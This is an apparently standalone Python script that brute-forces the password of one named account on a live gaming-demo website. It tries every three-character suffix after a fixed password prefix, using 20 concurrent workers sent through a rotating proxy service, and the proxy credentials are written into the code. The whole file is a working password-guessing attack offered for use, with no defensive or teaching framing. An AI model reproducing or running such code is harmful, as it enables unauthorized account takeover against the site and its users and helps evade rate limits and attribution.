from pyrogram import Client
import aiohttp
import asyncio
import itertools
import string


async def attempt_login(
        session: aiohttp.ClientSession,
        proxy: str,
        password_queue: asyncio.Queue,
        found_event: asyncio.Event
):
    while not password_queue.empty() and not found_event.is_set():
        try_pass = await password_queue.get()

        form_data = {
            'userName': 'LSICE24_133',
            'password': try_pass,
        }
        try:
            async with session.post(
                url="https://demo.luckystreaklive.com/Login/Login/",
                data=form_data,
                proxy=proxy
            ) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        if data["status"] != "Error":
                            print(f"Succeed with password {try_pass}")
                            found_event.set()
                            return try_pass  # Return the successful password
                        else:
                            print(f"Failed with password {try_pass}")
                    except Exception as e:
                        print(f"Failed to parse JSON or network error: {e}")
                else:
                    print(
                        f"Failed with status code {resp.status} password {try_pass}")
        except aiohttp.ClientHttpProxyError as e:
            print(f"Proxy {proxy} failed with error: {e}")
        except aiohttp.ServerDisconnectedError:
            print("The server disconnected unexpectedly. Continue")
        except aiohttp.ClientOSError as e:
            print(e)


async def main():
    characters = string.digits + string.ascii_lowercase
    combinations = (''.join(combo)
                    for combo in itertools.product(characters, repeat=3))

    password_queue = asyncio.Queue()
    found_event = asyncio.Event()

    # Populate the queue with all possible passwords
    for try_pass in combinations:
        password = f'7ucky5tr34k_{try_pass}'
        await password_queue.put(password)

    proxy = "http://005844proxy-rotate:005844proxy@p.webshare.io:80"
    async with aiohttp.ClientSession() as session:
        tasks = [
            asyncio.create_task(attempt_login(
                session, proxy, password_queue, found_event))
            for _ in range(20)
        ]

        # Wait until all the tasks are completed
        successful_password = await asyncio.gather(*tasks)

        # Filter out None values and print successful passwords
        successful_passwords = [
            password for password in successful_password if password]
        for password in successful_passwords:
            print(f"Password found: {password}")

client = Client("main")
asyncio.run(main())
